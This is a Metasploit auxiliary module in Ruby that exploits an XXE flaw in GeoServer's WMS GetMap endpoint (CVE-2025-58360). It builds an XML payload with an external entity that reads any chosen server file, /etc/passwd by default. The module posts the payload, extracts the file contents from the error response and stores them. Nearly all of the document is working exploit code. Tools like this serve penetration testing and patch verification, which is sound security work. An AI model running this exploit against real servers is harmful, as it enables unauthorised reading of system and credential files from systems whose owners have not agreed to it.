##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'GeoServer WMS GetMap XXE Arbitrary File Read',
        'Description' => %q{
          This module exploits an XML External Entity (XXE) vulnerability in GeoServer
          via the WMS GetMap operation. The vulnerability allows reading arbitrary files
          from the server's file system by injecting an XXE entity in the SLD (Styled Layer Descriptor).

          Affected versions:
          - GeoServer >= 2.26.0, <= 2.26.1
          - GeoServer <= 2.25.5

          The file content is returned in the error message when the layer name contains
          the XXE entity reference.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'xbow-security',                              # Vulnerability discovery
          'Valentin Lobstein <chocapikk[at]leakix.net>' # Metasploit module
        ],
        'References' => [
          ['CVE', '2025-58360'],
          ['URL', 'https://github.com/geoserver/geoserver/security/advisories/GHSA-fjf5-xgmq-5525']
        ],
        'DisclosureDate' => '2025-11-25',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to GeoServer', '/geoserver']),
        OptString.new('FILEPATH', [true, 'The filepath to read on the server', '/etc/passwd'])
      ]
    )
  end

  # NOTE: No check method implemented as the GeoServer version page
  # (AboutGeoServerPage) requires authentication in most configurations,
  # making version detection unreliable without credentials.

  def build_xxe_payload(file_path)
    entity_name = Rex::Text.rand_text_alpha_lower(8)
    %(<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE StyledLayerDescriptor [
<!ENTITY #{entity_name} SYSTEM "file://#{file_path}">
]>
<StyledLayerDescriptor version="1.0.0">
<NamedLayer><Name>&#{entity_name};</Name></NamedLayer>
</StyledLayerDescriptor>)
  end

  def build_wms_uri
    # Generate random width and height using Rex::Text (100-500)
    width, height = Array.new(2) do
      100 + (Rex::Text.rand_text_numeric(3).to_i % 401)
    end

    # Randomize bbox coordinates (valid geographic bounds) using Rex::Text
    # Generate min_x, max_x ensuring min_x < max_x
    min_x = (-180.0 + (Rex::Text.rand_text_numeric(3).to_i % 179)).round(2)
    max_x = (min_x + 0.1 + (Rex::Text.rand_text_numeric(3).to_i % ((180.0 - min_x) * 10).to_i) / 10.0).round(2)
    max_x = [max_x, 180.0].min

    # Generate min_y, max_y ensuring min_y < max_y
    min_y = (-90.0 + (Rex::Text.rand_text_numeric(2).to_i % 89)).round(2)
    max_y = (min_y + 0.1 + (Rex::Text.rand_text_numeric(2).to_i % ((90.0 - min_y) * 10).to_i) / 10.0).round(2)
    max_y = [max_y, 90.0].min

    bbox_coords = [min_x, min_y, max_x, max_y]

    base_uri = normalize_uri(target_uri.path, 'wms')
    params = {
      'service' => 'WMS',
      'version' => '1.1.0',
      'request' => 'GetMap',
      'width' => width,
      'height' => height,
      'format' => 'image/png',
      'bbox' => bbox_coords.join(',')
    }

    "#{base_uri}?#{params.map { |k, v| "#{k}=#{v}" }.join('&')}"
  end

  def extract_file_content(response_body)
    # Extract content between "Unknown layer:" and "</ServiceException>"
    regex = %r{Unknown layer:\s*([\s\S]+?)</ServiceException>}
    match = response_body.match(regex)
    return nil unless match

    content = match[1]&.strip
    content&.empty? ? nil : content
  end

  def send_xxe_request
    uri = build_wms_uri
    payload = build_xxe_payload(datastore['FILEPATH'])

    print_status("Sending XXE payload to #{uri}")

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => uri,
      'ctype' => 'application/xml',
      'data' => payload
    })

    fail_with(Failure::Unreachable, 'No response from server') unless res
    unless res.code == 200
      fail_with(Failure::UnexpectedReply, "Server returned unexpected status code: #{res.code}")
    end

    res
  end

  def run
    print_status("Attempting to read file: #{datastore['FILEPATH']}")

    res = send_xxe_request
    file_content = extract_file_content(res.body)

    unless file_content
      return print_error('XXE exploitation failed - file content not found in response')
    end

    print_good("Successfully read file: #{datastore['FILEPATH']}")
    print_line
    print_line(file_content)
    print_line

    path = store_loot(
      'geoserver.file',
      'text/plain',
      datastore['RHOST'],
      file_content,
      File.basename(datastore['FILEPATH']),
      'File read from GeoServer via XXE (CVE-2025-58360)'
    )

    print_good("File saved to: #{path}")
  end

end
